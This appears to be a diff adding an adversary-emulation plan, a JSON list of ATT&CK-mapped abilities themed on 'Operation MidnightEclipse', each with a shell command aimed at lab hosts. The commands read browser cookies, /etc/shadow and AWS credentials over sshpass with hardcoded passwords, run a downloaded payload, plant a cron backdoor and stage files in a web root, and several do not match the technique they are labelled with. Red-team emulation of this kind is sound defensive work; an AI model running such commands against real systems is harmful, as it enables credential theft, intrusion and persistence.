@@ -1,0 +1,272 @@
+[
+  {
+    "ability_id": "fd5c0b8f-6a97-5be0-9438-a79e224a40c5",
+    "name": "T1005 - Data from Local System",
+    "tactic": "collection",
+    "technique_name": "Data from Local System",
+    "technique_id": "T1005",
+    "description": "During Operation MidnightEclipse, threat actors stole saved cookies and login data from targeted systems.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -s --noproxy '*' http://172.21.0.20 -o /dev/null; sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'cat /home/attacker/.config/google-chrome/Default/Cookies'"
+      }
+    ]
+  },
+  {
+    "ability_id": "ec257139-26e2-5ecd-bf1c-dcc1f3074d8d",
+    "name": "T1078.002 - Domain Accounts",
+    "tactic": "defense-evasion",
+    "technique_name": "Domain Accounts",
+    "technique_id": "T1078.002",
+    "description": "During Operation MidnightEclipse, threat actors used a compromised domain admin account to move laterally.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'dir' && smbclient //172.21.0.20/share -U DebianUser%DebianUser -c 'get fake_service.sh'"
+      }
+    ]
+  },
+  {
+    "ability_id": "ac057959-e74e-5c1f-8f86-67e5b556bf69",
+    "name": "T1003.003 - NTDS",
+    "tactic": "credential-access",
+    "technique_name": "NTDS",
+    "technique_id": "T1003.003",
+    "description": "During Operation MidnightEclipse, threat actors obtained active directory credentials via the NTDS.DIT file.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "smbclient //172.21.0.20/share -U root%P@ssw0rd -c 'ls'"
+      }
+    ]
+  },
+  {
+    "ability_id": "34b6e6ad-685e-5c73-838f-048d43b49f21",
+    "name": "T1059.004 - Unix Shell",
+    "tactic": "execution",
+    "technique_name": "Unix Shell",
+    "technique_id": "T1059.004",
+    "description": "During Operation MidnightEclipse, threat actors piped output from stdout to bash for execution.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh -o StrictHostKeyChecking=no attacker@172.21.0.20 'curl -s http://example.com/malicious.sh | cat'"
+      }
+    ]
+  },
+  {
+    "ability_id": "1424dee0-f076-5c11-b725-26b16ecbebd9",
+    "name": "T1090 - Proxy",
+    "tactic": "command-and-control",
+    "technique_name": "Proxy",
+    "technique_id": "T1090",
+    "description": "During Operation MidnightEclipse, threat actors used the GO Simple Tunnel reverse proxy tool.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+      }
+    ]
+  },
+  {
+    "ability_id": "7ba784c6-245c-5b39-b3c4-b5d6b5c6fda2",
+    "name": "T1559 - Inter-Process Communication",
+    "tactic": "execution",
+    "technique_name": "Inter-Process Communication",
+    "technique_id": "T1559",
+    "description": "During Operation MidnightEclipse, threat actors wrote output to stdout then piped it to bash for execution.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"ls -la\" | socat - UNIX-CONNECT:/tmp/mysocket'"
+      }
+    ]
+  },
+  {
+    "ability_id": "7f03073b-5bf7-5581-a977-30fc81f3c5ad",
+    "name": "T1071.001 - Web Protocols",
+    "tactic": "command-and-control",
+    "technique_name": "Web Protocols",
+    "technique_id": "T1071.001",
+    "description": "During Operation MidnightEclipse, threat actors used `wget` via HTTP to retrieve payloads.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=whoami' http://172.21.0.20:5055/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "faf4f21f-517d-53ac-aaa5-83876a1acfe8",
+    "name": "T1078 - Valid Accounts",
+    "tactic": "defense-evasion",
+    "technique_name": "Valid Accounts",
+    "technique_id": "T1078",
+    "description": "During Operation MidnightEclipse, threat actors extracted sensitive credentials while moving laterally through compromised networks.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 id; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cat /etc/shadow' > /tmp/shadow_hosta.txt; sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'"
+      }
+    ]
+  },
+  {
+    "ability_id": "1d124748-96de-5461-85a0-3e80ba9ec61c",
+    "name": "T1190 - Exploit Public-Facing Application",
+    "tactic": "initial-access",
+    "technique_name": "Exploit Public-Facing Application",
+    "technique_id": "T1190",
+    "description": "During Operation MidnightEclipse, threat actors exploited CVE-2024-3400 in Palo Alto Networks GlobalProtect.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl -X POST -F 'cmd=id' http://172.21.0.20:5055/exec"
+      }
+    ]
+  },
+  {
+    "ability_id": "49e1f26e-fb31-5db5-b0ca-e0c2c7a79436",
+    "name": "T1584.003 - Virtual Private Server",
+    "tactic": "resource-development",
+    "technique_name": "Virtual Private Server",
+    "technique_id": "T1584.003",
+    "description": "During Operation MidnightEclipse, threat actors abused Virtual Private Servers to store malicious files.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'id && cat /etc/passwd' && sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.22.0.20 id'"
+      }
+    ]
+  },
+  {
+    "ability_id": "8bff2fd9-bb91-5f6c-b610-2fe81571a86a",
+    "name": "T1105 - Ingress Tool Transfer",
+    "tactic": "command-and-control",
+    "technique_name": "Ingress Tool Transfer",
+    "technique_id": "T1105",
+    "description": "During Operation MidnightEclipse, threat actors downloaded additional payloads on compromised devices.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p RootPass123 ssh -o StrictHostKeyChecking=no root@172.21.0.20 'chmod +x /tmp/payload.sh && /tmp/payload.sh'"
+      }
+    ]
+  },
+  {
+    "ability_id": "fc1cbe41-d0a0-5b8c-b3fa-e06a18bed749",
+    "name": "T1588.002 - Tool",
+    "tactic": "resource-development",
+    "technique_name": "Tool",
+    "technique_id": "T1588.002",
+    "description": "During Operation MidnightEclipse, threat actors used the GO Simple Tunnel (GOST) reverse proxy tool.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "curl --proxy http://172.21.0.20:8888 http://172.22.0.20"
+      }
+    ]
+  },
+  {
+    "ability_id": "819b5cfe-2794-50b7-8d67-a1a8608a9de8",
+    "name": "T1053.003 - Cron",
+    "tactic": "execution",
+    "technique_name": "Cron",
+    "technique_id": "T1053.003",
+    "description": "During Operation MidnightEclipse, threat actors configured cron jobs to retrieve payloads from actor-controlled infrastructure.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"wget http://localhost/backdor.sh\" > /root/backdoor_task.sh'  && sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'echo \"* * * * * root /root/backdoor_task.sh\" > /etc/cron.d/backdoor_task && chmod 644 /etc/cron.d/backdoor_task'"
+      }
+    ]
+  },
+  {
+    "ability_id": "5eddd009-0f3e-5c5f-9fe9-3ff35fd2df2a",
+    "name": "T1021.002 - SMB/Windows Admin Shares",
+    "tactic": "lateral-movement",
+    "technique_name": "SMB/Windows Admin Shares",
+    "technique_id": "T1021.002",
+    "description": "During Operation MidnightEclipse, threat actors used SMB to pivot internally in victim networks.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "smbclient -U attacker%attacker //172.21.0.20/share -c 'ls'"
+      }
+    ]
+  },
+  {
+    "ability_id": "4d23172a-dd72-5a9d-aa70-f30b4a57e2d5",
+    "name": "T1074.001 - Local Data Staging",
+    "tactic": "collection",
+    "technique_name": "Local Data Staging",
+    "technique_id": "T1074.001",
+    "description": "During Operation MidnightEclipse, threat actors copied files to the web application folder on compromised devices for exfiltration.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'cp /etc/passwd /var/www/html/'"
+      }
+    ]
+  },
+  {
+    "ability_id": "9cf688c4-f4a9-5361-9a47-f204ffd991af",
+    "name": "T1021.006 - Windows Remote Management",
+    "tactic": "lateral-movement",
+    "technique_name": "Windows Remote Management",
+    "technique_id": "T1021.006",
+    "description": "During Operation MidnightEclipse, threat actors used WinRM to move laterally in targeted networks.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'RootPass123' ssh -o StrictHostKeyChecking=no root@172.21.0.20 'sshpass -p \"RootPass123\" ssh -o StrictHostKeyChecking=no root@172.22.0.20 hostname'"
+      }
+    ]
+  },
+  {
+    "ability_id": "a8de43be-fcde-5302-9cfd-446e3e5996dc",
+    "name": "T1584.006 - Web Services",
+    "tactic": "resource-development",
+    "technique_name": "Web Services",
+    "technique_id": "T1584.006",
+    "description": "During Operation MidnightEclipse, threat actors abused compromised AWS buckets to store files.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "sshpass -p 'Passw0rd' ssh attacker@172.21.0.20 \"cat ~/.aws/credentials\" && echo \"aws s3 ls not available on lab!\""
+      }
+    ]
+  },
+  {
+    "ability_id": "a8de43be-fcde-5302-9cfd-roth",
+    "name": "END OF EMULATION",
+    "tactic": "impact",
+    "technique_name": "System Shutdown",
+    "technique_id": "T1529",
+    "description": "This is the end.",
+    "executors": [
+      {
+        "name": "sh",
+        "platform": "linux",
+        "command": "echo \"END OF OPERATION MIDNIGHT ECLIPSE\""
+      }
+    ]
+  }    
+]
